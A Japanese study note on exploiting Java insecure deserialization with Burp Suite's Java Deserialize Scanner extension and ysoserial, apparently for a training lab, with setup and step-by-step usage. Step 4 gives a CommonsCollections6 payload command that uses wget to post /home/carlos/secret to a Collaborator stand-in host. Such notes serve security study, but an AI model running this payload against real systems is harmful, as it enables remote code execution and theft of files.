
###### 何ができるのか

- Javaのinsecure deserializationを検出・悪用できる
- 様々なライブラリに対して攻撃できる
- 異なる複数のエンコーディングを選択できる

###### 制限

- 実行できるコマンドやライブラリが限られている
- これに依存しない。基本は*ysoserial*をターミナルで使用することが一番

### 実行ステップ

###### 設定の変更

- Ysoserial pathを以下に変更
```
/Users/ikedakoshiro/forBurpSuite/ysoserial-all.jar
```
![[Pasted image 20240213110013.png | 300]]

###### Exploitまでの流れ

1. オブジェクトを含むリクエストを右クリック-> Extensions -> Java Deserialize Scanner -> "Send request to DS -Exploitation"でリクエストを送る
2. Set insertion Point: シリアライズ化されたオブジェクトに対してIntruderのように選択する
3. Encoding: 対象のオブジェクトがエンコーディングされた順番通りにAdd -->する。
	- [[⚡️Insecure deserialization#エンコーディング方式を明らかにする]]
4. ライブラリとコマンドを入力する
```zsh
CommonsCollections6 'wget https://COLLABORATOR_DOMAIN --post-file=/home/carlos/secret'
```
5. Attack
	- ==⚠️==: Attackが選択できないときはExtensionからUnloadし、loadを2セット繰り替えす(バグによるもの)
	- ==⚠️==: Java Deserialized Sccanerによって検知されたライブラリは実際と異なるケースもあるので、CommonsCollectionの番号を変えつつCollaboratorを確認すること
![[Pasted image 20240218165612.png | 500]]

6. レスポンスからじゃうまくいったのかわからないので、ライブラリの番号を変えつつCollaboratorが光るのをみるのがいいかも

###### 参考ビデオ

- [youtube](https://www.youtube.com/watch?v=9fUcqaayHGo): 22:00~